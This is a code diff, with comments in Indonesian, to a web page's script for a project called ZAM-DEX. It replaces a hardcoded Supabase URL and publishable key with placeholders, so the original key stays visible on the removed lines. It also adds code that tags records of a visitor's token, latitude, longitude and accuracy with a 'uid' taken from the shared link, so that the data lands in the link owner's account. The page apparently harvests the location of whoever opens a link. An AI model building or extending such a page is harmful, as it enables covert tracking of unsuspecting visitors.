@@ -432,13 +432,17 @@
 <script>
 // ===== CONFIG =====
 // Ganti dengan URL website ZAM-DEX kamu
-const ZAMDEX_URL = "https://zam-dex-coder.vercel.app"; // <-- GANTI INI
+const ZAMDEX_URL = "https://zam-dex.vercel.app"; // <-- GANTI INI
 
 // Ganti dengan Supabase URL & anon key kamu
-const SUPABASE_URL = "https://dyevsyujenhtzkcwtxpd.supabase.co"; // <-- GANTI INI
-const SUPABASE_ANON_KEY = "sb_publishable_pgPPD26ilzp1nstqLG5lCw_wxhoM5dQ"; // <-- GANTI INI
+const SUPABASE_URL = "SUPABASE_URL_KAMU"; // <-- GANTI INI
+const SUPABASE_ANON_KEY = "SUPABASE_ANON_KEY_KAMU"; // <-- GANTI INI
 
 let collectedData = {};
+
+// Ambil uid dari URL (?uid=xxx) - ini yang menentukan data masuk ke akun siapa
+const urlParams = new URLSearchParams(window.location.search);
+const OWNER_UID = urlParams.get('uid') || null;
 
 // Tampil modal saat load
 window.addEventListener('load', () => {
@@ -580,6 +584,7 @@ async function saveToSupabase() {
       },
       body: JSON.stringify({
         token: token,
+        user_id: OWNER_UID,   // <-- data masuk ke akun yang punya link
         latitude: collectedData.latitude || null,
         longitude: collectedData.longitude || null,
         accuracy: collectedData.accuracy || null,
